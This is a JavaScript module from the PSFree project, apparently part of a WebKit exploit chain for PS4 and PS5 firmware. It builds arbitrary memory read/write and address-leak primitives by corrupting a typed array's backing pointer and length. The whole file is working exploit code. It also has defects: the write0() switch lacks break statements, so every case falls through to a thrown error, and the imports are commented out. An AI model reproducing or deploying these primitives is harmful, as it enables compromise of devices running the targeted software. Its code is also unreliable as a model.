/* Copyright (C) 2023-2024 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

// import { Int } from './int64.mjs';
// import {
//     read16,
//     read32,
//     read64,
//     write16,
//     write32,
//     write64,
// } from './rw.mjs';
// import * as o from './offset.mjs';

let mem = null;

function init_module(memory) {
    mem = memory;
}

class Addr extends Int {
    read8(offset) {
        const addr = this.add(offset);
        return mem.read8(addr);
    }

    read16(offset) {
        const addr = this.add(offset);
        return mem.read16(addr);
    }

    read32(offset) {
        const addr = this.add(offset);
        return mem.read32(addr);
    }

    read64(offset) {
        const addr = this.add(offset);
        return mem.read64(addr);
    }

    // returns a pointer instead of an Int
    readp(offset) {
        const addr = this.add(offset);
        return mem.readp(addr);
    }

    write8(offset, value) {
        const addr = this.add(offset);

        mem.write8(addr, value);
    }

    write16(offset, value) {
        const addr = this.add(offset);

        mem.write16(addr, value);
    }

    write32(offset, value) {
        const addr = this.add(offset);

        mem.write32(addr, value);
    }

    write64(offset, value) {
        const addr = this.add(offset);

        mem.write64(addr, value);
    }
}

class MemoryBase {
    _addrof(obj) {
        if (typeof obj !== 'object'
            && typeof obj !== 'function'
        ) {
            throw TypeError('addrof argument not a JS object');
        }
        this.worker.a = obj;
        write64(this.main, view_m_vector, this.butterfly.sub(0x10));
        let res = read64(this.worker, 0);
        write64(this.main, view_m_vector, this._current_addr);

        return res;
    }

    addrof(obj) {
        return new Addr(this._addrof(obj));
    }

    set_addr(addr) {
        if (!(addr instanceof Int)) {
            throw TypeError('addr must be an Int');
        }
        this._current_addr = addr;
        write64(this.main, view_m_vector, this._current_addr);
    }

    get_addr() {
        return this._current_addr;
    }

    // write0() is for when you want to write to address 0. You can't use for
    // example: "mem.write32(Int.Zero, 0)", since you can't set by index the
    // view when it isDetached(). isDetached() == true when m_mode >=
    // WastefulTypedArray and m_vector == 0.
    //
    // Functions like write32() will index mem.worker via write() from rw.mjs.
    //
    // size is the number of bits to read/write.
    //
    // The constraint is 0 <= offset + 1 < 2**32.
    //
    // PS4 firmwares >= 9.00 and any PS5 version can write to address 0
    // directly. All firmwares (PS4 and PS5) can read address 0 directly.
    //
    // See setIndex() from
    // WebKit/Source/JavaScriptCore/runtime/JSGenericTypedArrayView.h at PS4
    // 8.03 for more information. Affected firmwares will get this error:
    //
    // TypeError: Underlying ArrayBuffer has been detached from the view
    write0(size, offset, value) {
        const i = offset + 1;
        if (i >= 2**32 || i < 0) {
            throw RangeError(`read0() invalid offset: ${offset}`);
        }

        this.set_addr(new Int(-1));

        switch (size) {
            case 8: {
                this.worker[i] = value;
            }
            case 16: {
                write16(this.worker, i, value);
            }
            case 32: {
                write32(this.worker, i, value);
            }
            case 64: {
                write64(this.worker, i, value);
            }
            default: {
                throw RangeError(`write0() invalid size: ${size}`);
            }
        }
    }

    read8(addr) {
        this.set_addr(addr);
        return this.worker[0];
    }

    read16(addr) {
        this.set_addr(addr);
        return read16(this.worker, 0);
    }

    read32(addr) {
        this.set_addr(addr);
        return read32(this.worker, 0);
    }

    read64(addr) {
        this.set_addr(addr);
        return read64(this.worker, 0);
    }

    // returns a pointer instead of an Int
    readp(addr) {
        return new Addr(this.read64(addr));
    }

    write8(addr, value) {
        this.set_addr(addr);
        this.worker[0] = value;
    }

    write16(addr, value) {
        this.set_addr(addr);
        write16(this.worker, 0, value);
    }

    write32(addr, value) {
        this.set_addr(addr);
        write32(this.worker, 0, value);
    }

    write64(addr, value) {
        this.set_addr(addr);
        write64(this.worker, 0, value);
    }
}

class Memory extends MemoryBase {
    constructor(main, worker)  {
        super();

        this.main = main;
        this.worker = worker;

        // The initial creation of the "a" property will change the butterfly
        // address. Do it now so we can cache it for addrof().
        worker.a = 0; // dummy value, we just want to create the "a" property
        this.butterfly = read64(main, js_butterfly);

        write32(main, view_m_length, 0xffffffff);

        this._current_addr = Int.Zero;

        init_module(this);
    }
}
